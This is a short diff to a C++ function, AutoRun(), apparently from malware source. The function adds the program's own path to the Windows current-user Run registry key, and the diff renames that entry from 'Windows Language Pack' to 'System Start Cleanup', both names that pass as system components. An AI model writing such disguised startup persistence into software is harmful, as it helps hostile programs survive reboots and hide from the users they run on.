@@ -229,7 +229,7 @@ void AutoRun() {
 	key = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_SET_VALUE, &hkey);
 	if (ERROR_SUCCESS == key)
 	{
-		key = RegSetValueExA(hkey, "Windows Language Pack", 0, REG_SZ, (BYTE*)FP.c_str(), FP.size()+1);
+		key = RegSetValueExA(hkey, "System Start Cleanup", 0, REG_SZ, (BYTE*)FP.c_str(), FP.size()+1);
 		RegCloseKey(hkey);
 	}
 	else {
